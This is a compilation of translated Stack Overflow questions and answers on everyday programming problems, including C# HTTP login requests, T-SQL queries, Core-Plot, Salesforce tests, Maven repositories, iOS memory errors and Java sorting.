        httprequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.142 Safari/535.19";

        httpresponse = (HttpWebResponse)httprequest.GetResponse();

        if (!(httpresponse.Cookies.Count > 0))
        { SetCookie(httpresponse, GetCookie(httprequest)); }

        return httpresponse;
    } 
```

主要的：

```
 string uri = "http://s2.kingsera.org";
        string userName = "someUserName";
        string passWord = "somePassWord";

        string postData = "signinUsername=" + userName + "&signinPassword=" + passWord + "&signinRemember=remember";
        CookieContainer cookie = new CookieContainer();

        HttpWebResponse response = PostData(uri, postData, cookie);

        CookieContainer c = GetCookie(response); 
```

似乎登录页面正在做一些事情使它变得更复杂！[http://s2.kingsera.org](http://s2.kingsera.org)

每一条评论/建议都将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:49:23.503

我不会从技术上回答你的问题，但是当我遇到这样的事情时，我会求助于[Fiddler](http://www.fiddler2.com/fiddler2/)，它会拦截你的计算机和远程服务器之间的网络流量。

这将允许您查看浏览器向远程服务器发出的确切请求及其所有标头、cookie 数据等，以及您的代码向远程服务器发出的请求。

这两个请求之间的差异应该向您展示解决问题的方法，或者至少为您提供许多额外的故障排除信息。

# sql - 有一个显示所有结果两次的查询

> ID：11651068
> 
> 赞同：0
> 
> 时间：2012-07-25T13:39:30.087
> 
> 标签：sql, sql-server

我需要一个返回所有行两次的查询。无法使用联合（因为它必须成为索引视图）。

有人知道怎么做吗？

（所以我不能这样做：）

```
select * from tags
union all
select * from tags 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:00:01.867

如果您准备创建另一个表，您可能会侥幸逃脱：

```
create table duplicator (id int)
insert into duplicator values (1),(2)
go
create view dups with schemabinding 
as
   select tags.column1, tags.column2, ... , duplicator.id
     from dbo.tags
    cross join dbo.duplicator
go
create unique clustered index ix_dups on dups(tags.PK, id) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:58:43.287

```
with temp(idx) as (
    select 1 as idx union select 2 as idx
)
select * from yourtable cross join temp 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T15:11:55.863

```
select row_number() over (order by columnnamehere), *
from
(
select * from tags 
union all
select * From tags 
) a 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:01:49.197

您不能使用联合（或 CTE，或自身的交叉连接等）创建索引视图。但是你可以做这样的事情（我对列名和主键做出假设）：

```
CREATE VIEW dbo.TagsView1
WITH SCHEMABINDING
AS
   SELECT col1, col2 FROM dbo.tags;
GO
CREATE UNIQUE CLUSTERED INDEX x ON dbo.TagsView(col1); 
```

现在创建一个执行联合的视图：

```
CREATE VIEW dbo.TagsView2
AS
   SELECT col1, col2 FROM dbo.TagsView1
   UNION ALL
   SELECT col1, col2 FROM dbo.TagsView1;
GO 
```

这在一定程度上满足了你的要求，但我仍然觉得这个要求很可疑。除非你能准确解释为什么你认为这应该是一个索引视图。如果答案是“因为它会更快”，那么答案是错误的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-25T14:08:15.537

您可以创建一个表来保存要复制的行数，然后对其进行交叉连接：

```
DECLARE @tblOrig table (PK int, fruitName varchar(20));
insert @tblOrig values (1, 'Apple');
insert @tblOrig values (2, 'Banana');
insert @tblOrig values (3, 'Pear');

DECLARE @tblDup table (DuplicateNumber int);
insert @tblDup values (1);
insert @tblDup values (2);

select t1.*
from @tblOrig t1
cross join @tblDup 
```

# sql-server - 在 SQL Server 2008 中的符号之前隔离字符串中的子字符串

> ID：11651074
> 
> 赞同：41
> 
> 时间：2012-07-25T13:39:44.037
> 
> 标签：sql-server, sql-server-2008, tsql, substring

我正在尝试从字符串中提取子字符串（在这种情况下，连字符之前的所有内容），如下所示：

```
Net Operating Loss - 2007
Capital Loss - 1991
Foreign Tax Credit - 1997 
```

并想要分别使用 SQL Server Management Studio 2008 的年份和名称（连字符前的子字符串）。有什么建议吗？或想法我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2012-07-25T13:46:23.707

```
DECLARE @test nvarchar(100)

SET @test = 'Foreign Tax Credit - 1997'

SELECT @test, left(@test, charindex('-', @test) - 2) AS LeftString,
    right(@test, len(@test) - charindex('-', @test) - 1)  AS RightString 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-25T15:04:13.817

```
DECLARE @dd VARCHAR(200) = 'Net Operating Loss - 2007';

SELECT SUBSTRING(@dd, 1, CHARINDEX('-', @dd) -1) F1,
       SUBSTRING(@dd, CHARINDEX('-', @dd) +1, LEN(@dd)) F2 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-02-16T05:36:21.453

这可以使用两个 SQL 函数来实现 - SUBSTRING 和 CHARINDEX

您可以将字符串读取到变量中，如上述答案所示，也可以将其添加到 SELECT 语句中，如下所示：

```
SELECT SUBSTRING('Net Operating Loss - 2007' ,0, CHARINDEX('-','Net Operating Loss - 2007')) 
```

# iphone - Core-Plot 不显示坐标轴标题

> ID：11651075
> 
> 赞同：0
> 
> 时间：2012-07-25T13:39:45.707
> 
> 标签：iphone, ios, core-plot

我正在使用 Core-Plot 来可视化一段时间内的温度值。除了一个例外，这很好用：没有显示轴的标题，也没有标记刻度。

您将在下面找到我正在使用的代码。我正在使用最新版本的 CorePlot-CocoaTouch。非常感谢任何帮助！提前致谢。

注意：基本上，我遇到了[这个 SO question](https://stackoverflow.com/questions/5349307/unable-to-show-anything-on-x-axis-and-y-axis-labels-in-core-plot)中所述的相同问题，但是从项目中删除/添加 CorePlot 并不能解决我的问题。

**编辑：**我使用了存储库中的最新版本。更改为 1.0（下载），它就像一个魅力。

```
CPTXYGraph *graph = [[CPTXYGraph alloc] initWithFrame:CGRectZero];
graphHostingView.collapsesLayers = NO; 
graphHostingView.hostedGraph     = graph;

graph.paddingLeft   = 10.0;
graph.paddingTop    = 10.0;
graph.paddingRight  = 10.0;
graph.paddingBottom = 10.0;

CPTXYPlotSpace *plotSpace = (CPTXYPlotSpace *)graph.defaultPlotSpace;
plotSpace.allowsUserInteraction = YES;
plotSpace.xRange                = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(0.0) length:CPTDecimalFromFloat(500.0)];
plotSpace.yRange                = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(0.0) length:CPTDecimalFromFloat(40.0)];

CPTXYAxisSet *axisSet = (CPTXYAxisSet *)graph.axisSet;    
CPTXYAxis *x          = axisSet.xAxis;
x.title = @"Date";
x.majorIntervalLength         = CPTDecimalFromString(@"280");
x.orthogonalCoordinateDecimal = CPTDecimalFromString(@"0");
x.minorTicksPerInterval       = 4;    

CPTXYAxis *y = axisSet.yAxis;
y.title = @"Temperature";
y.majorIntervalLength         = CPTDecimalFromString(@"10");
y.orthogonalCoordinateDecimal = CPTDecimalFromString(@"0");
y.minorTicksPerInterval       = 2;    

CPTScatterPlot *temperaturePlot  = [[CPTScatterPlot alloc] init];
temperaturePlot.interpolation = CPTScatterPlotInterpolationCurved;
temperaturePlot.dataSource    = self;

[graph addPlot:temperaturePlot]; 
```

**编辑**：向 plotArea 添加填充没有帮助，如下面的屏幕截图所示。 ![没有填充的绘图](../Images/5e4f1a113f4d49d31273e993f3314515.png) ![带填充的绘图](../Images/0725464a43dc9607a28dd9d1ef3c7bf8.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T00:02:57.163

您需要在绘图区域框架中添加一些填充以为标签腾出空间。

```
graph.plotAreaFrame.paddingLeft   = 70.0;
graph.plotAreaFrame.paddingTop    = 20.0;
graph.plotAreaFrame.paddingRight  = 20.0;
graph.plotAreaFrame.paddingBottom = 80.0; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T11:34:36.157

这个问题还没有解决，我把它转发到了官方问题列表（[core-plot issue](http://code.google.com/p/core-plot/issues/detail?id=448)）。目前，我切换回 1.0 版，它按预期工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-26T07:28:20.140

只需尝试将带有一些自定义标签文本样式的 labelTextStyle 属性添加到您的轴。 `axisSet.xAxis.labelTextStyle = LabelStyle;` LabelStyle 是 的一个对象`CPTMutableTextStyle`。

# unit-testing - Salesforce - 如何运行具有特定配置文件权限的 testMethods？

> ID：11651079
> 
> 赞同：0
> 
> 时间：2012-07-25T13:39:54.350
> 
> 标签：unit-testing, salesforce

我们有一段代码旨在从公共站点的用户运行。

目前，testMethods 以标准测试用户身份运行，并且代码运行良好。但是，站点上的功能失败，在运行代码之前请求用户身份验证（不应该，因为用户没有 Salesforce 凭据）。

有没有一种方法可以让 testMethods 作为站点的访客用户或类似的配置文件运行？请记住，我们无法事先知道配置文件的名称，并且在运行测试时配置文件甚至可能不存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-27T04:56:48.480

```
Profile p = [SELECT Id FROM Profile WHERE Name='MyProfile']; 

User u = new User(Alias = 'standt', Email='standarduser@testorg.com', 
        EmailEncodingKey='UTF-8', LastName='Testing', LanguageLocaleKey='en_US', 
        LocaleSidKey='en_US', ProfileId = p.Id, TimeZoneSidKey='America/Los_Angeles', UserName='standarduser@testorg.com');

System.runAs(u) 
{
        System.debug('Current User: ' + UserInfo.getUserName());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-06-21T10:48:02.707

您将需要创建一个具有特定配置文件或相关权限集的用户。您可以在先前的方法中执行此操作。对该方法也使用@isTest。

然后使用 Run As System.runAs(u) 功能以该用户身份运行该方法。

访问[https://nonitechsolutions.blogspot.com/2021/06/salesforce-enable-guest-user-on-your.html](https://nonitechsolutions.blogspot.com/2021/06/salesforce-enable-guest-user-on-your.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-25T19:18:02.677

Salesforce 有 System.runas 方法以特定用户身份运行测试。如果您提前不知道配置文件名称，我假设您是在托管包或类似的东西中执行此操作。

您可以从[文档中执行以下示例](http://www.salesforce.com/us/developer/docs/apexcode/index_Left.htm#CSHID=apex_testing_tools_runas.htm%7CStartTopic=Content/apex_testing_tools_runas.htm%7CSkinName=webhelp "文档")

```
public class TestRunAs {
   public static testMethod void testRunAs() {
      User u;
      u = [select ID from user where communitynickname = :yoursitename]

      System.runAs(u) {
      // The following code runs as user 'u'  

      System.debug('Current User: ' + UserInfo.getUserName());
      System.debug('Current Profile: ' + UserInfo.getProfileId()); } 
```

} }

# javascript - Javascript和科学处理？

> ID：11651081
> 
> 赞同：25
> 
> 时间：2012-07-25T13:40:05.103
> 
> 标签：javascript, data-mining, scientific-computing

Matlab、R 和 Python 功能强大，但对于我想做的一些数据挖掘工作来说要么成本高昂，要么速度慢。我正在考虑使用 Javascript 来 [提高速度](http://julialang.org/)、良好的可视化库以及能够将浏览器用作界面。

我面临的第一个问题是科学编程的一个显而易见的问题，如何对数据文件进行 I/O？第二个是客户端还是服务器端？最后一个问题，我可以做一些真正便携的东西，即将它全部放在 USB 上并从中运行吗？

我花了几个星期寻找答案。Server2go 似乎解决了客户端/服务器的需求，我*认为*这意味着我可以从客户端的程序中获取数据。Server2go 还允许从 USB 运行。我使用的数据文件通常是 XML，并且似乎有几个 javascript 转换器到 JSON。

但是，在环顾四周之后，我不确定我的方法是否有意义。所以在我进一步承诺之前，关于 Javascript 作为科学数据处理的便携式工具的任何建议/想法/指导？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-25T14:57:03.097

我不得不同意 JavaScript 不适合科学处理的评论。但是，您最了解自己的要求；也许您已经找到了可以满足您需要的有用库。请注意，您必须自己实现*所有*逻辑。没有内置处理复数、矩阵或积分或......通常程序员时间比机器时间更有价值。就个人而言，我会研究编译语言；*在*我用我最喜欢的任何语言创建了一个速度不够快的第一个版本之后。

假设 JavaScript 是要走的路：

# 数据输入/输出

我可以想到三个选项：

## 使用 ajax 向服务器发送和接收数据

似乎是您使用 Server2go 找到的解决方案。它需要您编写一个服务器后端，但这可以保持非常简单。它真正需要做的就是能够读取和写入文件作为对客户端应用程序的响应。

## 使用包含文件 I/O 的 v8 的非浏览器实现

例如[Node.js](http://nodejs.org/)。然后，您*可以避免*对服务器的需求，而只需使用命令行界面，所有代码都将是 JavaScript。除此之外，它大致相当于第一个选项。

## 使用您要求用户保存或加载的[文件 API](http://www.w3.org/TR/FileAPI/)创建文件对象

在我看来，这是最糟糕的选择，因为*需要*用户交互。它将避免对服务器的需要；您的应用程序可以是一个简单的 html 文件，它使用 ajax 请求加载所有数据文件。您必须使用特殊开关启动 Chrome 以允许使用`file://`协议的 ajax 请求，如此[处所述](https://stackoverflow.com/questions/10038256/my-xml-file-is-not-being-by-google-chrome-and-internet-explorer)

这些选项*只*与文件 I/O 相关，您不能在 JavaScript 中进行文件 I/O。这是因为浏览器*不能允许*任意 Web 代码进行任意文件 I/O；安全影响将是可怕的。每个选项都描述了一种*不*进行文件 I/O 的方法。

第一个与为客户端执行文件 I/O 的服务器通信。

第二种使用“特殊”版本的 JavaScript，其条件与浏览器不同，因此安全隐患并不重要。但这意味着您必须在您使用的实际实现中查看文件 I/O 是如何完成的，这对 JavaScript 来说并不常见。

第三个要求用户控制文件I/O。

# 界面

即使您不使用 JavaScript 进行实际处理（到目前为止这是共识），也没有什么能阻止您使用浏览器作为界面或 JavaScript 库进行可视化。这是 JavaScript 擅长的。

如果您想交互式地控制您的数据挖掘工具，您*将*需要一个可以控制该工具的服务器。Server2go 应该可以工作，或者如果您使用 Node.js 中的内置服务器，或者...如果您不需要数据工具的交互式控制；`file//:`也就是说，您首先生成处理后的数据，然后通过使用协议和[JSONP](https://en.wikipedia.org/wiki/JSONP)查看服务器可以避免的数据。但真的；避免服务器不应该是一个目标。

我不会详细介绍接口问题，因为没有什么特别要说的，而且几乎*所有*关于 javascript 的文章都是关于接口的。

一件事，一定要使用像[Angular.js](http://angularjs.org/)或[Knockout.js](http://knockoutjs.com/)这样的声明性数据绑定库。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-07-26T05:54:46.973

JavaScript 速度被严重*高估*了。这是一个 Web 2.0 的神话。

让我稍微解释一下这个说法（不要因为我说了你不想听的话而对我投反对票！）

当然，JavaScript V8 是一个高度优化的虚拟机。它确实在幼稚的基准测试中击败了许多其他脚本语言。

但是，它是一种范围非常有限的语言。它适用于网络的“ADHS 世界”。这是尽最大的努力，但它可能会失败，并且您对按时完成或完成的事情几乎没有保证。

以 MongoDB 为例。起初，它似乎又好又快，而且提供了很多。直到您看到例如 MapReduce 仅是单线程的，因此非常慢。不是所有的金子都会发光！

现在看看数据挖掘相关的库，比如 BLAS。基本的线性代数、数学运算等。英特尔和 AMD 等所有 CPU 制造商都为其 CPU提供**优化版本。**这是一项优化，需要详细了解各个 CPU，远远超出了我们当前编译器的能力。这些库包含针对各种 CPU 的优化代码路径，它们基本上都在做同样的事情。对于这些操作，使用 BLAS 等优化库可以轻松实现 5-20 倍的加速；同时，通常在 O(n^2) 或 O(n^3) 中的矩阵运算将主导您的整体运行时间。

**所以一门好的数据挖掘语言会让你一路走上机器码！**

Pythons SciPy 和 R 在这里是不错的选择。它们内部具有优化的库并且易于访问，但同时允许以更简单的语言进行包装。

看看这个编程语言基准：

[http://benchmarksgame.alioth.debian.org/u32/which-programs-are-fastest.html](http://benchmarksgame.alioth.debian.org/u32/which-programs-are-fastest.html)

纯 JavaScript 具有很大的差异，这表明它可以快速完成*某些*事情（主要是正则表达式！）而其他事情则慢得多。它可以明显击败 PHP，但同样明显地被 C 和 Java 击败。

**多线程**对于现代数据挖掘也很重要。今天很少有大型系统有一个核心，你确实想利用所有核心。因此，您需要具有一组强大的多线程操作的库和编程语言。这实际上是 Fortran 和 C 在这里失去人气的原因。其他语言（例如 Java）在这里要好得多。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-12-18T13:56:19.373

虽然这个讨论有点老了，而且无论如何我都不是 Javascript 专家，但我发现上述论点对于没有处理速度或高级数学运算的能力是值得怀疑的。WebGL 是一个用于渲染高级 2D 和 3D 图形的 Javascipt API，它严重依赖高级数学运算。我相信从技术角度来看这些功能是存在的，但是缺少的是处理统计分析、自然语言处理和数据挖掘中包含的其他预测分析的优秀库。

WebGL 基于 openGL，后者又使用[BLAS 之类的库（](http://en.wikipedia.org/wiki/Basic_Linear_Algebra_Subprograms)[此处](http://www.netlib.org/blas/)为库信息）。

node.js、w8 等先进技术使其在技术上成为可能。缺少的是我们可以在 R 和 Scilab 中找到的库来执行相同的操作。

# c# - 如何拥有“公众公众”与“内部公众”？

> ID：11651086
> 
> 赞同：2
> 
> 时间：2012-07-25T13:40:16.973
> 
> 标签：c#, internalsvisibleto

> **可能重复：**
> [何时应使用 [assembly: InternalsVisibleTo()]？](https://stackoverflow.com/questions/3279639/when-should-assembly-internalsvisibleto-be-used)
> [访问 dll 方法](https://stackoverflow.com/questions/6420910/access-to-dll-methods)

我有两个程序集，A.dll 和 B.dll。A.dll 有一些共同的特点，B.dll 使用它。我最终必须为其他用户分发 A.dll 和 B.dll。

但是，我将 A.dll 中的一些方法标记为公共（供 B.dll 使用），但我不希望其他人使用它们。

有没有好的方法来实现这一目标？是使用[`InternalsVisibleToAttribute`](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.internalsvisibletoattribute.aspx)一个好的做法来实现这一点吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-25T13:42:32.303

在 A.dll 中将项目标记为内部并添加以下程序集属性

```
using System.Runtime.CompilerServices;

[assembly: InternalsVisibleTo( "B" )] 
```

但请注意，您仍然可以通过反射访问内部内容，因此它不是 100% 密封的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T13:51:44.967

该`InternalsVisibleToAttribute`属性是执行此操作的一种方法，但您必须意识到它将*所有*内部结构暴露给另一个程序集。

另请注意，如果您不使用已签名的程序集，则将允许从具有该名称的*任何*`InternalsVisibleToAttribute`程序集访问内部。这可能是不可取的。

 *另一种选择是使用工具将所需代码从程序集“A”注入程序集“B”。这将允许“B”独立运行而无需访问内部。这取决于您的程序集是如何使用的，这是否是一个理想的解决方案。

最后，您可以使用反射访问程序集“A”中的代码。这有点繁琐，但如果你只需要几件事，它可能就足够了。这也将允许您在程序集“B”存在但缺少 A 时提供良好的后备或错误处理。

正如其他人所指出的那样，反射可以提供对内部或不内部程序集中任何内容的访问。如果你需要保护你的代码，你应该考虑混淆。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T13:43:04.987

`InternalsVisibleTo`是要走的路。

你的问题的标题起初有点令人困惑，但在阅读之后很明显你想要的是让特定程序集可以访问一些`internal`（**不是）成员。** `public`*

# java - Maven 如何与不同的存储库交互？

> ID：11651088
> 
> 赞同：2
> 
> 时间：2012-07-25T13:40:32.130
> 
> 标签：java, maven, nexus, artifactory

Maven 如何与 Nexus 和 Artifactory 等不同的存储库交互？

是使用他们的 REST API 完成的吗？可以将依赖工件解析到实际位置以使用这些 API 获取它们，但是这两个 API 彼此有些不同（据我所知[[Artifactory]](http://wiki.jfrog.org/confluence/display/RTF/Artifactory%27s+REST+API#ArtifactorysRESTAPI-ARTIFACTSSTORAGE) [​​[Nexus]](https://repository.sonatype.org/nexus-core-documentation-plugin/core/docs/rest.artifact.maven.resolve.html)）和 Maven pom 文件中的存储库定义元素不包含用于说明存储库类型的属性。

那么 Maven 是如何将 artifact 的 groupId、artifactId 和 version 解析为不同存储库中的实际文件的呢？这些存储库是否实现了其他一些标准化 API，使 Maven 能够以与存储库无关的方式从它们请求文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:59:27.650

Maven 使用某种命名约定。在`pom.xml`您定义存储库的根 URL（例如`http://download.java.net/maven/2/`）中，然后 maven 能够通过构造 URL 来解析工件：

```
<root URL>/${group id where dots are replaced by slashes}/${artifact id}/${version} 
```

所以对于以下依赖

```
<groupId>org.apache.lucene</groupId>
<artifactId>lucene-core</artifactId>
<version>2.0.0</version> 
```

Maven 将尝试在以下位置找到 poms 和 jar`http://download.java.net/maven/2/org/apache/lucene/lucene-core/2.0.0`

这意味着遵循此约定的每个 URI 都可以用作 Maven 存储库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:43:25.053

Yoy 定义存储库以两种方式搜索工件：

1）在项目部分的 pom.xml 中

```
<project>
    ....
    <repositories>
         <repository>
            ...
            <url>...</url>
         </repository>
    </repositories>
</project> 
```

2）和/或在文件中`$USER_HOME$/.m2/settings.xml`（WEB上有很多例子）

Maven 通过使用存储库 URL 构造工件的 URL 并根据工件组、ID、版本、类型和分类器附加路径来下载工件。并将 groupId 中的点转换为 '/'

```
RepoUrl/groupId/artifactId/version/artifactId-version-classifier.type 
```

例子：

```
https://repository.apache.org/content/repositories/releases/commons-io/commons-io/2.4/commons-io-2.4.jar

https://repository.apache.org/content/repositories/releases/commons-io/commons-io/2.4/commons-io-2.4-sources.jar

https://repository.apache.org/content/repositories/releases/commons-io/commons-io/2.4/commons-io-2.4-javadoc.jar 
```

这是惯例，它独立于 Artifactory 或 Nexus。这是马文。一切都通过 HTTP 或 HTTPS 传输。此外，Maven 出于安全目的处理 MD5 和 SHA1 文件。

下载后，工件存储在工作站上的本地存储库中`$USER_HOME$/.m2/repositories`（它的结构类似于远程存储库），充当缓存和代理。

通常，Artifactory 或 Nexus 是公司级别的本地缓存和代理，具有一些管理它的功能。当然，它们托管公司开发人员发布的 Maven 工件。

看起来像 3 级存储库：本地 - 本地公司 - 全球

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T13:49:09.357

maven 使用正常的 http 调用与存储库进行交互。您不需要任何东西，只需要一个 http 服务器来为 maven 存储库提供服务。maven 依赖于特定的目录层次结构和一些元数据文件。（maven 缓存已下载文件的本地磁盘存储库是完全相同的格式）。

# iphone - ios 5.1 开发“发送到已释放实例的消息”

> ID：11651106
> 
> 赞同：0
> 
> 时间：2012-07-25T13:41:45.347
> 
> 标签：iphone, ios, ios5.1

我在我的应用程序中看到以下错误。当我在回调方法中加载新的 SubView 时会发生这种情况。以下是完整的详细信息。

在我的应用程序中，当应用程序启动时，我有 RootViewController，它添加了一个名为“AuthCheck”的子视图。在其中，我执行身份验证检查，向用户显示正在发生的事情的详细信息。在 AuthCheckController 中，我有一个回调方法来处理异步身份验证过程，如下所示。

```
 - (void)shellAuthRequired: (ServiceResponse *)response {

    [super shellAuthRequired:response];

    if (response.hasError) {

        [self showTryAgainAlert: response.errorText];
        return;
    }

    // TODO: go to main screen from here.
    IntroViewViewController *intview = [[IntroViewViewController alloc]initWithNibName:@"IntroViewViewController" bundle:nil];

    //[self.navigationController pushViewController:intview animated:YES];
    [self.view addSubview:intview.view];
} 
```

如您所见，在此方法中，我将用户转发到一个新屏幕，在该屏幕上显示必要的身份验证相关详细信息，并且该屏幕将有一个继续按钮。当用户单击“继续”时，我会加载一个名为“WebViewController”的新子视图。下面的代码

```
 -(IBAction)btnContinueToClicked:(id)sender
{
    WebViewController *wview = [[WebViewController alloc] initWithNibName:@"WebViewController" bundle:nil];
    [self.view addSubview:wview.view]
} 
```

当我添加要转发到的新子视图时，出现异常“[IntroViewViewController performSelector:withObject:withObject:]: message sent to deallocated instance 0xd062f50”。

是什么导致了这个错误？

谢谢

维什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T13:47:43.563

您没有保留对 intview 对象的引用。我假设您使用的是 ARC，这意味着您从中获取视图的控制器将在您的方法结束后立即消失。试着让它成为一个强大的属性。

# lotus-notes - 选择电子邮件发送到哪个电子邮件地址（在同一联系人中）

> ID：11651114
> 
> 赞同：0
> 
> 时间：2012-07-25T13:42:10.923
> 
> 标签：lotus-notes

全部，

这听起来可能是一个非常简单的问题，但我是 Lotus Notes 8 的新手，我周围似乎没有人知道答案。

与大多数人一样，我为每个联系人保留多个电子邮件地址（即：他们的工作和个人电子邮件）。（例如：john.doe@company.com 和 john.doe@gmail.com；这两个电子邮件地址都在“John Doe”联系人下）。

当我向“John Doe”发送电子邮件时，Lotus Notes 8 只会在“收件人：”字段中显示“John Doe”，而不会通知我这两个电子邮件地址中的哪个电子邮件地址。

有谁知道我如何显示/选择将电子邮件发送到哪个电子邮件地址？

提前谢谢米

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T19:22:24.290

Rich 是正确的，这是针对编程问题的，但我找到了解决方案，尽管我不确定他们何时引入它。

此答案可能仅在 Notes 8.5 或更高版本中有效。我使用 8.5.3 UP1。

在您进行提前输入时，联系人姓名会出现在发送至字段下方。如果有多个地址，则显示主要地址，并在右侧显示“扭曲”。将鼠标悬停在名称上会扩展曲折以显示并允许选择备用电子邮件。这是一个示例（我配偶的电子邮件已编辑。:-)）

![在此处输入图像描述](../Images/353cd94f2d078d4db8100390d1178429.png)

享受。

/新人

# salesforce - 销售队伍中的 sql 连接查询

> ID：11651118
> 
> 赞同：3
> 
> 时间：2012-07-25T13:42:27.353
> 
> 标签：salesforce, soql

我正在为查询而苦苦挣扎，我想选择所有分支机构，然后再次“加入”公司（帐户类型），其中的联系人。直到现在还没有运气，我做错了什么？

```
SELECT 
b.Id, b.Location,
  (SELECT FirstName, LastName, FROM b.Companies.Contacts 
    //i've tried combinations of __r and __c
  WHERE City == 'New York')  
FROM Branche__c b 
```

我这部分的 WSDL 是这样构建的：

```
<complexType name="Branche__c">
  ..
     <element name="Companies__r" nillable="true" minOccurs="0" type="ens:Account"/>
  ..
</complexType>
..
<complexType name="帐户">
  ..
  <element name="Contacts" nillable="true" minOccurs="0" type="tns:QueryResult"/>
  ..
</complexType>
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T17:55:40.350

有一个@JCD 告诉你，这是 Salesforce 的限制。

您只能通过这种方式同时列出所有与 Accounts 相关的 Contacts 与 Branches 相关：

```
SELECT Email, Account.Name, 
FROM Contact
WHERE AccountId in (
 SELECT Companies__c
   FROM Branche__c
) 
```

但是如果你想在这些*联系人*和*分支之间建立***连接**，你应该尝试这样的事情：

 **```
list[] res = new list[]{};
for (Branche__c br : [SELECT Id, Location ,Companies__c FROM Branche__c])
{
     List[] ContactList = [select name, (select email from contacts) from account where id = :br.Companies__c]; 
     res.add(ContactList);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:43:41.937

当您说“类型帐户”时，您的意思是“公司”是帐户的标签吗？

如果是这样，试试这个：

```
Select 
  Name, Id, 
  (Select FirstName, LastName From Contacts Where MailingCity = 'New York')
From Account 
Where ID IN (Select CompanyID From Branch__c) 
```

其中 CompanyID 是 Branch__c 上 Account 关系字段的 API 名称。

我不确定这是否会有所帮助，但这可能就足够了。

另外，我建议在编写 SOQL 语句时使用[Force.com Explorer](http://wiki.developerforce.com/page/ForceExplorer)来浏览元数据，而不是通过 WSDL 来查看。**

# java - 与 collections.sort 绑定不匹配

> ID：11651120
> 
> 赞同：1
> 
> 时间：2012-07-25T13:42:30.680
> 
> 标签：java, collections, comparable

我有一个应用程序，它有一个 sqlite 数据库，其内容被放入一个数组列表并可以通过列表视图查看。我的问题是我无法按字母顺序获取该项目。我已经实现`Collections.sort()`但收到一个 Bound Mismatch 错误。有任何想法吗

错误：

`sort(List<T>)`绑定不匹配：类型的泛型方法`Collections`不适用于 arguments `(ArrayList<LoginDetails>)`。推断的类型`LoginDetails`不是有界参数的有效替代品`<T extends Comparable<? super T>>`

```
private ListView loginList;
private Button webLogin;
private ListAdapter loginListAdapter;
private ArrayList<LoginDetails> loginArrayList;

    public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.login_listview);

    loginList = (ListView)
    findViewById(R.id.loginlist);
    loginList.setOnItemClickListener(this);

    webLogin = (Button)
    findViewById(R.id.button3);
    webLogin.setOnClickListener(this);

    loginArrayList = new ArrayList<LoginDetails>();
    loginListAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, populateList());
    loginList.setAdapter(loginListAdapter);

    Collections.sort(loginArrayList ); //Bound mismatch error is here.
    } 
```

登录详细信息：

```
public class LoginDetails {

private String sName;
private String wUrl;
private String uName;
private String pWord;

public String getsName() {
return sName;
}
public void setsName(String sName) {
this.sName = sName;
}

public String getwUrl() {
return wUrl;
}
public void setwUrl(String wUrl) {
this.wUrl = wUrl;
}

public String getuName() {
return uName;
}
public void setuName(String uName) {
this.uName = uName;
}
public String getpWord() {
return pWord;
}
public void setpWord(String pWord) {
this.pWord = pWord;
}

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T16:40:34.683

如 API 文档中所述，对于`Collections.sort`：

> 列表中的所有元素都必须实现 Comparable 接口。

确保`LoginDetails`实现`Comparable`.

例如：

```
public class LoginDetails implements Comparable<LoginDetails>{
    //...        

    @Override
    public int compareTo(LoginDetails another) {
        return uName.compareTo(another.uName);
    }

    //... 
```

# c# - 检查括号并删除它们

> ID：11651124
> 
> 赞同：0
> 
> 时间：2012-07-25T13:42:33.863
> 
> 标签：c#

其实我最初误解了这个问题，

基本上我检查是否有错误，并检查某些会破坏它的可怕字符，但这不适用于括号，我需要在通过 SQL 传递字符串之前检查字符串中是否有任何括号如果有，将它们从字符串中直接删除。

例如说我有一个看起来像的字符串

```
[I am a magical string with super powers!){ 
```

我希望删除所有这些可怕的括号！

```
 if (compiler.Parser.GetErrors().Count == 0)
        {
            AstNode root = compiler.Parse(phrase.ToLower());
            if (compiler.Parser.GetErrors().Count == 0)
            {
                try
                {
                    fTextSearch = SearchGrammar.ConvertQuery(root, SearchGrammar.TermType.Inflectional);
                }
                catch
                {
                    fTextSearch = phrase;
                }
            }
            else
            {
                fTextSearch = phrase;
            }
        }
